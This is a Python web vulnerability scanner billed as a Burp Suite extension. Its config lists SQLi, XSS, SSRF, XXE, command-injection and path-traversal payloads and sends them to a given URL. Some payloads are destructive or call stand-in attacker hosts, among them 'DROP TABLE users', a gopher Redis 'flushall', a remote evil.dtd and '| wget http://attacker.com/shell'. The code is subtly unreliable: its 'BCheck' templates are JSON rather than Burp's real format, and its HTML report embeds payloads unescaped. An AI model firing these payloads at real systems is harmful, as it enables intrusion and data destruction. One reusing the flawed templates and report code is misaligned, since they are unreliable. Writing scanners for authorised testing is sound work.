#!/usr/bin/env python3
"""
Burp Suite Extension Framework for Critical Vulnerability Detection
This framework provides automated testing capabilities for high-severity bugs
"""

import json
import re
import base64
import hashlib
import time
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Any, Optional, Tuple
import requests
from concurrent.futures import ThreadPoolExecutor
import threading

class BurpExtensionFramework:
    """Main framework for Burp Suite security testing automation"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        self.scan_results = {}
        self.config = self.load_config()
        
    def load_config(self) -> Dict[str, Any]:
        """Load configuration for different vulnerability types"""
        return {
            'sql_injection': {
                'enabled': True,
                'payloads': [
                    "' OR '1'='1",
                    "' UNION SELECT NULL--",
                    "'; DROP TABLE users--",
                    "' OR 1=1#",
                    "' UNION SELECT @@version--",
                    "admin'--",
                    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
                ],
                'error_patterns': [
                    'sql syntax',
                    'mysql_fetch_array',
                    'ORA-',
                    'PostgreSQL',
                    'SQLite',
                    'Microsoft OLE DB Provider',
                    'mysql_num_rows',
                    'mysql_fetch_assoc',
                    'mysql_fetch_object',
                    'mysql_fetch_row',
                    'mysql_fetch_field',
                    'mysql_num_fields',
                    'mysql_list_dbs',
                    'mysql_list_tables',
                    'mysql_list_fields'
                ]
            },
            'xss': {
                'enabled': True,
                'payloads': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '"><script>alert("XSS")</script>',
                    'javascript:alert("XSS")',
                    '<svg onload=alert("XSS")>',
                    '"><img src=x onerror=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                    '<body onload=alert("XSS")>',
                    '<input onfocus=alert("XSS") autofocus>',
                    '<select onchange=alert("XSS")><option>1</option></select>'
                ],
                'reflection_patterns': [
                    r'<script>alert\("XSS"\)</script>',
                    r'<img src=x onerror=alert\("XSS"\)>',
                    r'javascript:alert\("XSS"\)'
                ]
            },
            'ssrf': {
                'enabled': True,
                'payloads': [
                    'http://localhost',
                    'http://127.0.0.1',
                    'http://0.0.0.0',
                    'http://[::1]',
                    'http://localhost:22',
                    'http://127.0.0.1:3306',
                    'http://localhost:6379',
                    'http://127.0.0.1:8080',
                    'file:///etc/passwd',
                    'file:///c:/windows/system32/drivers/etc/hosts',
                    'dict://localhost:11211/stat',
                    'ftp://localhost:21',
                    'gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*'
                ],
                'detection_methods': ['response_time', 'error_messages', 'dns_requests']
            },
            'xxe': {
                'enabled': True,
                'payloads': [
                    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
                    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><data>&file;</data>',
                    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%int;%send;]>'
                ],
                'file_read_patterns': [
                    'root:x:0:0',
                    '127.0.0.1',
                    'localhost'
                ]
            },
            'command_injection': {
                'enabled': True,
                'payloads': [
                    '; ls -la',
                    '| whoami',
                    '& dir',
                    '`id`',
                    '$(whoami)',
                    '; cat /etc/passwd',
                    '| netstat -an',
                    '& type C:\\windows\\system32\\drivers\\etc\\hosts',
                    '; ping -c 1 127.0.0.1',
                    '| wget http://attacker.com/shell'
                ],
                'os_command_patterns': [
                    'uid=',
                    'gid=',
                    'root:x:0:0',
                    'Active Connections',
                    'Proto Recv-Q Send-Q',
                    'PING 127.0.0.1'
                ]
            },
            'path_traversal': {
                'enabled': True,
                'payloads': [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                    '....//....//....//etc/passwd',
                    '..%2F..%2F..%2Fetc%2Fpasswd',
                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                    '..%252F..%252F..%252Fetc%252Fpasswd',
                    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
                    '..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts'
                ],
                'file_read_patterns': [
                    'root:x:0:0',
                    '127.0.0.1',
                    'localhost',
                    'Microsoft Windows'
                ]
            },
            'open_redirect': {
                'enabled': True,
                'payloads': [
                    'https://evil.com',
                    '//evil.com',
                    'javascript:window.location="https://evil.com"',
                    'data:text/html,<script>window.location="https://evil.com"</script>',
                    'https://attacker.com%0d%0aHost:%20legitimate.com'
                ],
                'redirect_patterns': [
                    'Location: https://evil.com',
                    'Location: //evil.com',
                    'window.location'
                ]
            },
            'idor': {
                'enabled': True,
                'test_patterns': [
                    'user_id',
                    'id',
                    'user',
                    'account',
                    'profile',
                    'order',
                    'invoice',
                    'document'
                ],
                'methods': ['GET', 'POST', 'PUT', 'DELETE']
            }
        }

class VulnerabilityScanner:
    """Scanner for different types of vulnerabilities"""
    
    def __init__(self, framework: BurpExtensionFramework):
        self.framework = framework
        self.session = framework.session
        self.config = framework.config
        
    def scan_sql_injection(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.config['sql_injection']['payloads']:
                try:
                    # Test GET parameter
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check for SQL error patterns
                    for pattern in self.config['sql_injection']['error_patterns']:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': pattern,
                                'severity': 'High',
                                'response_code': response.status_code
                            })
                            break
                            
                except Exception as e:
                    print(f"Error testing SQL injection: {e}")
                    
        return vulnerabilities
    
    def scan_xss(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Scan for XSS vulnerabilities"""
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.config['xss']['payloads']:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check for payload reflection
                    for pattern in self.config['xss']['reflection_patterns']:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': 'Payload reflected in response',
                                'severity': 'High',
                                'response_code': response.status_code
                            })
                            break
                            
                except Exception as e:
                    print(f"Error testing XSS: {e}")
                    
        return vulnerabilities
    
    def scan_ssrf(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Scan for Server-Side Request Forgery"""
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.config['ssrf']['payloads']:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    start_time = time.time()
                    response = self.session.get(url, params=test_params, timeout=15)
                    response_time = time.time() - start_time
                    
                    # Check for SSRF indicators
                    if response_time > 5:  # Slow response might indicate internal request
                        vulnerabilities.append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'Slow response time: {response_time:.2f}s',
                            'severity': 'High',
                            'response_code': response.status_code
                        })
                        
                except Exception as e:
                    print(f"Error testing SSRF: {e}")
                    
        return vulnerabilities
    
    def scan_xxe(self, url: str, data: str) -> List[Dict[str, Any]]:
        """Scan for XML External Entity injection"""
        vulnerabilities = []
        
        for payload in self.config['xxe']['payloads']:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(url, data=payload, headers=headers, timeout=10)
                
                # Check for file read evidence
                for pattern in self.config['xxe']['file_read_patterns']:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'XML External Entity (XXE)',
                            'url': url,
                            'payload': payload,
                            'evidence': pattern,
                            'severity': 'Critical',
                            'response_code': response.status_code
                        })
                        break
                        
            except Exception as e:
                print(f"Error testing XXE: {e}")
                
        return vulnerabilities
    
    def scan_command_injection(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Scan for command injection vulnerabilities"""
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.config['command_injection']['payloads']:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check for OS command output
                    for pattern in self.config['command_injection']['os_command_patterns']:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': 'Command Injection',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': pattern,
                                'severity': 'Critical',
                                'response_code': response.status_code
                            })
                            break
                            
                except Exception as e:
                    print(f"Error testing command injection: {e}")
                    
        return vulnerabilities
    
    def scan_path_traversal(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Scan for path traversal vulnerabilities"""
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.config['path_traversal']['payloads']:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check for file read evidence
                    for pattern in self.config['path_traversal']['file_read_patterns']:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': 'Path Traversal',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': pattern,
                                'severity': 'High',
                                'response_code': response.status_code
                            })
                            break
                            
                except Exception as e:
                    print(f"Error testing path traversal: {e}")
                    
        return vulnerabilities

class BCheckScriptGenerator:
    """Generate BCheck scripts for Burp Suite"""
    
    def __init__(self):
        self.templates = self.load_templates()
        
    def load_templates(self) -> Dict[str, str]:
        """Load BCheck script templates"""
        return {
            'sql_injection': '''
{
  "metadata": {
    "name": "SQL Injection Scanner",
    "description": "Detects SQL injection vulnerabilities",
    "severity": "High",
    "confidence": "Certain"
  },
  "request": {
    "method": "GET",
    "url": "{{url}}",
    "parameters": {
      "{{param}}": "{{payload}}"
    }
  },
  "response": {
    "status_code": 200,
    "body_contains": ["sql syntax", "mysql_fetch_array", "ORA-"]
  }
}
''',
            'xss': '''
{
  "metadata": {
    "name": "XSS Scanner",
    "description": "Detects Cross-Site Scripting vulnerabilities",
    "severity": "High",
    "confidence": "Certain"
  },
  "request": {
    "method": "GET",
    "url": "{{url}}",
    "parameters": {
      "{{param}}": "{{payload}}"
    }
  },
  "response": {
    "status_code": 200,
    "body_contains": ["<script>alert(\"XSS\")</script>"]
  }
}
''',
            'ssrf': '''
{
  "metadata": {
    "name": "SSRF Scanner",
    "description": "Detects Server-Side Request Forgery vulnerabilities",
    "severity": "High",
    "confidence": "Certain"
  },
  "request": {
    "method": "GET",
    "url": "{{url}}",
    "parameters": {
      "{{param}}": "{{payload}}"
    }
  },
  "response": {
    "status_code": 200,
    "response_time": ">5000"
  }
}
'''
        }
    
    def generate_sql_injection_bcheck(self, url: str, param: str, payload: str) -> str:
        """Generate BCheck script for SQL injection"""
        return self.templates['sql_injection'].replace(
            '{{url}}', url
        ).replace(
            '{{param}}', param
        ).replace(
            '{{payload}}', payload
        )
    
    def generate_xss_bcheck(self, url: str, param: str, payload: str) -> str:
        """Generate BCheck script for XSS"""
        return self.templates['xss'].replace(
            '{{url}}', url
        ).replace(
            '{{param}}', param
        ).replace(
            '{{payload}}', payload
        )
    
    def generate_ssrf_bcheck(self, url: str, param: str, payload: str) -> str:
        """Generate BCheck script for SSRF"""
        return self.templates['ssrf'].replace(
            '{{url}}', url
        ).replace(
            '{{param}}', param
        ).replace(
            '{{payload}}', payload
        )

class ReportGenerator:
    """Generate comprehensive security reports"""
    
    def __init__(self):
        self.report_template = self.load_report_template()
        
    def load_report_template(self) -> str:
        """Load HTML report template"""
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Security Scan Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .vulnerability { border: 1px solid #ddd; margin: 10px 0; padding: 15px; }
        .critical { border-left: 5px solid #ff0000; }
        .high { border-left: 5px solid #ff6600; }
        .medium { border-left: 5px solid #ffcc00; }
        .low { border-left: 5px solid #00cc00; }
        .severity { font-weight: bold; padding: 5px 10px; border-radius: 3px; }
        .critical-bg { background-color: #ffebee; }
        .high-bg { background-color: #fff3e0; }
        .medium-bg { background-color: #fff8e1; }
        .low-bg { background-color: #e8f5e8; }
    </style>
</head>
<body>
    <h1>Security Vulnerability Report</h1>
    <p>Generated on: {{timestamp}}</p>
    <p>Target: {{target}}</p>
    
    <h2>Summary</h2>
    <p>Total vulnerabilities found: {{total_vulns}}</p>
    <p>Critical: {{critical_count}}</p>
    <p>High: {{high_count}}</p>
    <p>Medium: {{medium_count}}</p>
    <p>Low: {{low_count}}</p>
    
    <h2>Vulnerabilities</h2>
    {{vulnerabilities}}
</body>
</html>
'''
    
    def generate_report(self, vulnerabilities: List[Dict[str, Any]], target: str) -> str:
        """Generate HTML security report"""
        import datetime
        
        # Count vulnerabilities by severity
        severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        for vuln in vulnerabilities:
            severity_counts[vuln['severity']] += 1
        
        # Generate vulnerability HTML
        vuln_html = ""
        for vuln in vulnerabilities:
            severity_class = vuln['severity'].lower()
            vuln_html += f'''
            <div class="vulnerability {severity_class}">
                <h3>{vuln['type']}</h3>
                <p><strong>Severity:</strong> <span class="severity {severity_class}-bg">{vuln['severity']}</span></p>
                <p><strong>URL:</strong> {vuln['url']}</p>
                <p><strong>Parameter:</strong> {vuln.get('parameter', 'N/A')}</p>
                <p><strong>Payload:</strong> <code>{vuln['payload']}</code></p>
                <p><strong>Evidence:</strong> {vuln['evidence']}</p>
                <p><strong>Response Code:</strong> {vuln['response_code']}</p>
            </div>
            '''
        
        # Fill template
        report = self.report_template.replace('{{timestamp}}', datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        report = report.replace('{{target}}', target)
        report = report.replace('{{total_vulns}}', str(len(vulnerabilities)))
        report = report.replace('{{critical_count}}', str(severity_counts['Critical']))
        report = report.replace('{{high_count}}', str(severity_counts['High']))
        report = report.replace('{{medium_count}}', str(severity_counts['Medium']))
        report = report.replace('{{low_count}}', str(severity_counts['Low']))
        report = report.replace('{{vulnerabilities}}', vuln_html)
        
        return report

# Example usage and testing
if __name__ == "__main__":
    # Initialize framework
    framework = BurpExtensionFramework()
    scanner = VulnerabilityScanner(framework)
    bcheck_generator = BCheckScriptGenerator()
    report_generator = ReportGenerator()
    
    # Example scan
    test_url = "http://testphp.vulnweb.com/search.php"
    test_params = {"q": "test"}
    
    print("Starting security scan...")
    
    # Run scans
    sql_vulns = scanner.scan_sql_injection(test_url, test_params)
    xss_vulns = scanner.scan_xss(test_url, test_params)
    ssrf_vulns = scanner.scan_ssrf(test_url, test_params)
    
    # Combine results
    all_vulnerabilities = sql_vulns + xss_vulns + ssrf_vulns
    
    # Generate report
    if all_vulnerabilities:
        report = report_generator.generate_report(all_vulnerabilities, test_url)
        with open('security_report.html', 'w') as f:
            f.write(report)
        print(f"Found {len(all_vulnerabilities)} vulnerabilities. Report saved to security_report.html")
    else:
        print("No vulnerabilities found.") 